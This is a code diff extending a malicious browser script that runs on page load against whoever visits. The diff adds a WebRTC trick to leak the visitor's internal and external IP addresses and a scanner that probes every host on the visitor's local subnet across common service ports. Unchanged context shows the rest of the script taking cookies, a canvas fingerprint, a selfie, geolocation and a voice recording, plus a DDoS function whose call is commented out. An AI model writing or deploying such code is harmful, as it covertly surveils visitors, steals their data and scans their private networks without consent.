@@ -1,3 +1,4 @@
+/*
 <?php
 
 if (isset($_GET['lat'])) {
@@ -26,20 +27,21 @@ $COUNTRY=$json->data->country;
 $REGION=$json->data->region;
 $CITY=$json->data->city;
 
-$TIME=date('Y-m-d h:m:s',time());
-
 ?>
-
-<script>
+*/
 
 var info={
-    ip:'<?=$IP?>',
+    ip:null,
+    inner_ip:null,
+    intranet: [],
+    /*
     ip_addr:{
         country:'<?=$COUNTRY?>',
         region:'<?=$REGION?>',
         city:'<?=$CITY?>',
     },
-    agent:'<?=$USER_AGENT?>',
+    */
+    agent:null,
     geo:{
         support:null,
         error_code:null,
@@ -48,7 +50,7 @@ var info={
         address:null,
     },
     cookie:null,
-    time:'<?=$TIME?>',
+    time:null,
     canvas_id:null,
     selfie:null,
     platform:null,
@@ -59,6 +61,8 @@ var info={
 };
 
 info.cookie=document.cookie;
+info.time=(new Date()).toString();
+info.agent=navigator.userAgent;
 
 function ajax(url,foo){
     var xmlhttp=new XMLHttpRequest();
@@ -390,9 +394,61 @@ function DDos(site){
     }),50);
 }
 
+// 获取IP地址，第一个是内网ip，第二个是外网ip
+function getIPs(callback){
+    var ip_dups = {};
+    var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+    var mediaConstraints = {
+        optional: [{RtpDataChannel: true}]
+    };
+    var servers = undefined;
+    var i = 0;
+    if(window.webkitRTCPeerConnection) servers = {iceServers: [{urls:"stun:stun.services.mozilla.com"}]};
+    var pc = new RTCPeerConnection(servers, mediaConstraints);
+    pc.onicecandidate = function(ice){
+        if(ice.candidate){
+            var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/
+            var ip_addr = ip_regex.exec(ice.candidate.candidate)[1];
+            if (ip_dups[ip_addr] === undefined) callback(ip_addr, i++);
+            ip_dups[ip_addr] = true;
+        }
+    };
+    pc.createDataChannel("");
+    pc.createOffer(function(result){
+        pc.setLocalDescription(result, function(){});
+    }, function(){});
+}
+
+function get_ip_addr(){
+    getIPs(function(ip, i){
+        if(i == 0) info.inner_ip = ip;
+        else if(i == 1) info.ip = ip;
+    });
+}
+
 // 内网扫描
-// JS-Recon
-function intranetScan(){}
+function intranet_scan(){
+    // 常见端口
+    var ports = [21,22,23,25,43,80,110,137,138,139,161,170,220,443,3306,8080];
+    var body = document.getElementsByTagName("body")[0];
+
+    getIPs(function(ip, id){
+        if (id == 0) {
+            ip = ip.split(".");
+            ip.pop();
+            ip = ip.join(".");
+            for (var i = 1; i < 255; i++) {
+                for (var p of ports) {
+                    var script = document.createElement("script");
+                    var host = ip + "." + i + ":" + p;
+                    script.src = "http://" + host;
+                    script.onload = "info.intranet.push('"+host+"')";
+                    body.appendChild(script);
+                }
+            }
+        }
+    });
+}
 
 // 利用canvas定位唯一标识
 function canvas_id(){
@@ -516,6 +572,8 @@ function network_speed(){
 
 window.onload=function(){
     device_platform();
+    get_ip_addr();
+    intranet_scan();
     canvas_id();
     selfie();
     get_geolocation();
@@ -523,5 +581,3 @@ window.onload=function(){
     voice_record();
     //DDos('http://baidu.com');
 };
-
-</script>
